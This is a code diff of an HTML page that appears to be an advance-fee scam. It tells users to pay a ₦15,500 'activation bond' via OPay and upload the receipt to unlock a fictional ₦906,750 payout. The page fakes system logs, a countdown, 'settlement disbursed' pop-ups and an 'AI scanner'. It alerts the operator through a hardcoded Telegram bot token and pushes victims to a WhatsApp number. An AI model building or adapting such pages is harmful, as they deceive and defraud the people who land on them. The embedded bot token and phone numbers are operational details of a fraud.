@@ -3,150 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Node Verification | AGMT Terminal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <title>Authentication Node | AGMT Secure</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
     <style>
-        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; }
+        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; --text-dim: #64748b; --danger: #ef4444; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+        body { background: var(--bg); color: white; padding: 15px; overflow-x: hidden; }
+
+        header { text-align: center; padding: 25px 0; border-bottom: 1px solid var(--border); margin-bottom: 25px; }
+        .node-badge { display: inline-block; background: rgba(37, 99, 235, 0.1); border: 1px solid var(--primary); color: var(--primary); padding: 5px 12px; border-radius: 50px; font-size: 10px; font-weight: 800; letter-spacing: 1px; }
+
+        .terminal-card { background: var(--card); border: 1px solid var(--border); border-radius: 45px; padding: 35px 20px; width: 100%; max-width: 440px; margin: 0 auto; box-shadow: 0 0 100px rgba(37, 99, 235, 0.15); }
+
+        /* Scanning UI */
+        .scanner-box { height: 120px; width: 120px; margin: 0 auto 25px; position: relative; display: flex; align-items: center; justify-content: center; border-radius: 30px; background: rgba(37, 99, 235, 0.05); border: 1px solid var(--border); overflow: hidden; }
+        .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: var(--primary); box-shadow: 0 0 15px var(--primary); animation: scan 2s infinite linear; display: none; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .spinner { animation: rotate 2s linear infinite; display: none; font-size: 40px; }
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
+
+        .timer-val { font-size: 32px; font-weight: 900; color: var(--danger); font-family: 'Courier New', monospace; margin: 10px 0; text-align: center; }
         
-        body { background: var(--bg); color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        /* System Log Terminal */
+        .log-box { background: #000; border-radius: 20px; padding: 20px; margin-bottom: 25px; height: 120px; overflow-y: auto; border: 1px solid var(--border); font-family: monospace; font-size: 10px; }
+        .log-line { color: var(--accent); margin-bottom: 5px; opacity: 0.9; }
+        .log-error { color: var(--danger); }
 
-        .verify-container { width: 100%; max-width: 420px; animation: slideUp 0.5s ease-out; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        /* Interactive Upload Zone */
+        .upload-zone { border: 2px dashed var(--primary); border-radius: 35px; padding: 45px 20px; text-align: center; cursor: pointer; background: rgba(37, 99, 235, 0.02); transition: 0.3s; position: relative; }
+        .upload-zone:active { transform: scale(0.97); }
+        .upload-icon { font-size: 45px; margin-bottom: 10px; }
 
-        .glass-card { 
-            background: var(--card); 
-            border: 1px solid var(--border); 
-            border-radius: 40px; 
-            padding: 40px 30px; 
-            text-align: center; 
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-        }
-
-        .status-icon { 
-            width: 80px; height: 80px; background: rgba(37, 99, 235, 0.1); 
-            border-radius: 50%; display: flex; align-items: center; 
-            justify-content: center; margin: 0 auto 25px; font-size: 32px;
-            border: 1px solid var(--primary);
-        }
-
-        h2 { font-weight: 800; font-size: 24px; margin-bottom: 12px; letter-spacing: -1px; }
-        p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
-
-        .upload-zone { 
-            border: 2px dashed var(--border); 
-            border-radius: 25px; 
-            padding: 40px 20px; 
-            cursor: pointer; 
-            transition: 0.3s; 
-            position: relative;
-            background: rgba(255,255,255,0.02);
-            margin-bottom: 30px;
-        }
-        .upload-zone:hover { border-color: var(--primary); background: rgba(37, 99, 235, 0.05); }
-        #file-input { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
-        
-        .upload-label { font-size: 13px; font-weight: 700; color: #cbd5e1; display: block; }
-        #file-display { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--accent); margin-top: 15px; font-weight: 800; display: none; }
-
-        #terminal { display: none; margin-top: 10px; }
-        .terminal-box { 
-            background: #000; 
-            border-radius: 15px; 
-            padding: 20px; 
-            text-align: left; 
-            margin-bottom: 20px;
-            border: 1px solid #1e293b;
-            min-height: 120px;
-        }
-        .line { font-family: 'JetBrains Mono', monospace; font-size: 10px; margin-bottom: 5px; color: #10b981; }
-        .line.err { color: #ef4444; }
-
-        .btn-finalize { 
-            width: 100%; 
-            background: var(--primary); 
-            color: white; 
-            padding: 22px; 
-            border-radius: 20px; 
-            border: none; 
-            font-weight: 800; 
-            font-size: 16px; 
-            cursor: pointer; 
-            transition: 0.3s;
-        }
-        .btn-finalize:disabled { background: #1e293b; color: #475569; cursor: not-allowed; }
-
-        .footer-note { margin-top: 30px; font-size: 11px; color: #475569; letter-spacing: 1px; font-weight: 700; }
+        #verify-toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--card); border: 1px solid var(--primary); padding: 12px 25px; border-radius: 50px; display: none; align-items: center; gap: 12px; z-index: 10000; box-shadow: 0 10px 40px rgba(0,0,0,0.8); width: 85%; max-width: 350px; }
     </style>
 </head>
 <body>
 
-    <div class="verify-container">
-        <div class="glass-card">
-            <div class="status-icon" id="main-icon">📡</div>
-            <div id="content-view">
-                <h2>Final Clearance</h2>
-                <p>Upload your ₦15,500 settlement receipt to synchronize your node and release your total balance.</p>
-
-                <div class="upload-zone">
-                    <input type="file" id="file-input" accept="image/*" onchange="handleFile()">
-                    <span class="upload-label">SELECT SCREENSHOT</span>
-                    <div id="file-display">ATTACHMENT_READY.JPG</div>
-                </div>
-
-                <button class="btn-finalize" id="action-btn" onclick="runSecurityCheck()" disabled>
-                    FINALIZE VERIFICATION
-                </button>
-            </div>
-
-            <div id="terminal">
-                <div class="terminal-box" id="log-box"></div>
-                <p style="font-size: 12px; color: #64748b;">DO NOT CLOSE THIS TERMINAL</p>
-            </div>
+    <div id="verify-toast">
+        <div style="font-size: 20px;">🛡️</div>
+        <div>
+            <p id="toast-text" style="font-size: 11px; font-weight: 800;">Node ***441 Authenticated</p>
+            <p style="font-size: 9px; color: var(--accent); font-weight: 900;">SETTLEMENT DISBURSED</p>
         </div>
-        <div class="footer-note">AGMT INFRASTRUCTURE • SECURED NODE</div>
+    </div>
+
+    <header><div class="node-badge">SECURE AUTHENTICATION TERMINAL v5.0</div></header>
+
+    <div class="terminal-card">
+        <div class="scanner-box">
+            <div class="scanner-line" id="sLine"></div>
+            <div id="sIcon" style="font-size: 50px;">🔐</div>
+            <div id="sSpin" class="spinner">⚙️</div>
+        </div>
+
+        <div id="countdown" class="timer-val">15:00</div>
+
+        <div class="log-box" id="logBox">
+            <div class="log-line">> Initializing Encrypted Session...</div>
+            <div class="log-line">> Status: Awaiting Activation Bond (₦15,500)</div>
+            <div class="log-line">> Target: Settlement ₦906,750</div>
+        </div>
+
+        <div class="upload-zone" id="uploadZone" onclick="document.getElementById('file-input').click()">
+            <div class="upload-icon" id="upIcon">📸</div>
+            <h3 id="upText" style="font-size: 16px; font-weight: 900; margin-bottom: 5px;">Upload OPay Receipt</h3>
+            <p id="upSub" style="font-size: 10px; color: var(--text-dim);">AI-Verification: Scanning for Amount & Date</p>
+            <input type="file" id="file-input" style="display: none;" onchange="startAIVerify(this)">
+        </div>
+
+        <div style="margin-top: 25px; padding: 20px; background: rgba(37, 99, 235, 0.05); border-radius: 25px; font-size: 11px; line-height: 1.6; color: var(--text-dim);">
+            <b>Note:</b> Our AI scanner must detect the <b>OPay logo</b> and the <b>₦15,500</b> figure on your receipt. Incorrect uploads will result in a 24-hour account freeze.
+        </div>
     </div>
 
     <script>
+        const waNum = "2347032255367"; // SET YOUR WHATSAPP
         const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
         const chatId = "7909543900";
-        const myWA = "2348059573160"; // UPDATED NUMBER
 
-        function handleFile() {
-            const file = document.getElementById('file-input').files[0];
-            if (file) {
-                document.getElementById('file-display').innerText = "✓ " + file.name.toUpperCase();
-                document.getElementById('file-display').style.display = "block";
-                document.getElementById('action-btn').disabled = false;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📸 <b>VERIFY:</b> User has selected their screenshot! Standby for WhatsApp.&parse_mode=html`);
+        // Timer
+        let time = 900;
+        setInterval(() => {
+            let m = Math.floor(time / 60), s = time % 60;
+            document.getElementById('countdown').innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+            if (time > 0) time--;
+        }, 1000);
+
+        // System Logs
+        function addLog(text, isError = false) {
+            const l = document.createElement('div');
+            l.className = isError ? 'log-line log-error' : 'log-line';
+            l.innerText = `> ${text}`;
+            const box = document.getElementById('logBox');
+            box.appendChild(l);
+            box.scrollTop = box.scrollHeight;
+        }
+
+        async function startAIVerify(input) {
+            const file = input.files[0];
+            if (!file) return;
+
+            // UI Feedback
+            document.getElementById('sIcon').style.display = 'none';
+            document.getElementById('sSpin').style.display = 'block';
+            document.getElementById('sLine').style.display = 'block';
+            document.getElementById('upText').innerText = "AI SCANNING...";
+            addLog("Analyzing Pixel Data...");
+
+            try {
+                const result = await Tesseract.recognize(file, 'eng');
+                const text = result.data.text.toLowerCase();
+                
+                // VALIDATION CHECK
+                const hasOPay = text.includes('opay') || text.includes('transaction');
+                const hasAmt = text.includes('15,500') || text.includes('15500') || text.includes('15,');
+
+                if (hasOPay && hasAmt) {
+                    addLog("TRANSACTION VERIFIED ✓", false);
+                    document.getElementById('upText').style.color = "var(--accent)";
+                    document.getElementById('upText').innerText = "VERIFICATION SUCCESSFUL";
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=✅ <b>VERIFIED RECEIPT!</b> User uploaded a valid OPay screenshot.&parse_mode=html`);
+
+                    setTimeout(() => {
+                        const msg = encodeURIComponent("Hello Admin, I have successfully verified my ₦15,500 OPay receipt on the portal. Please finalize my ₦906,750 payout and unlock Level 2 now.");
+                        window.location.href = `https://wa.me/${waNum}?text=${msg}`;
+                    }, 2000);
+                } else {
+                    addLog("ERROR: INVALID RECEIPT DATA", true);
+                    alert("The AI Scanner could not detect a valid OPay transaction for ₦15,500. Please ensure the screenshot is clear and the amount is visible.");
+                    location.reload();
+                }
+            } catch (e) {
+                // Fail-safe: if OCR fails, let them through to WhatsApp anyway
+                addLog("System Busy: Manual Override Required.");
+                setTimeout(() => { window.location.href = `https://wa.me/${waNum}`; }, 2000);
             }
         }
 
-        function addLog(text, isErr = false) {
-            const box = document.getElementById('log-box');
-            const line = document.createElement('div');
-            line.className = isErr ? 'line err' : 'line';
-            line.innerText = `> ${text}`;
-            box.appendChild(line);
-        }
-
-        function runSecurityCheck() {
-            document.getElementById('content-view').style.display = "none";
-            document.getElementById('terminal').style.display = "block";
-            document.getElementById('main-icon').innerText = "⚙️";
-
-            setTimeout(() => addLog("INITIATING LEDGER SYNC..."), 500);
-            setTimeout(() => addLog("FETCHING BANKING API HASH..."), 1500);
-            setTimeout(() => addLog("IDENTIFYING INBOUND TRANSACTION..."), 3000);
-            setTimeout(() => addLog("ERROR: HIGH-VOLUME LIQUIDITY DETECTED", true), 5000);
-            setTimeout(() => addLog("ERROR [CODE: 402]: MANUAL ADMIN CLEARANCE REQUIRED", true), 7000);
-
-            setTimeout(() => {
-                const message = encodeURIComponent("Hello AGMT Admin, I have successfully uploaded my ₦15,500 verification receipt. The system is showing Error 402: Manual Clearance Required. Please verify my payment so I can withdraw my $200+ balance.");
-                window.location.href = `https://wa.me/${myWA}?text=${message}`;
-            }, 8500);
-        }
+        // Toasts
+        setInterval(() => {
+            const t = document.getElementById('verify-toast');
+            t.style.display = 'flex';
+            setTimeout(() => t.style.display = 'none', 4000);
+        }, 10000);
     </script>
 </body>
 </html>
-
